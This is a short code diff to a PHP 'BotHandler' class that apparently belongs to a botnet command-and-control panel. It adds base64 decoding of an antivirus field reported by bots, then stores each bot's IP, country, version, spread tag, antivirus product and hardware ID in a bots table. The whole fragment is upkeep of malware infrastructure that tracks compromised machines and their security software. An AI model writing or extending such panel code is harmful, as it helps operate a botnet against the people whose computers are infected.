@@ -109,6 +109,8 @@ class BotHandler
                 }
                 if(empty($postbot["antivirus"])){
                     $postbot["antivirus"] = "none";
+                }else{
+                    $postbot["antivirus"] = base64_decode($postbot["antivirus"]);
                 }
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, version = ?, country = ?, spreadtag = ?, countryName = ?, antivirus = ?  WHERE hwid = ?");
                 $statement->execute(array($ip,$postbot["botversion"],  $country, trim($postbot["spreadtag"]),$countryName,$postbot["antivirus"],$postbot["hwid"]));
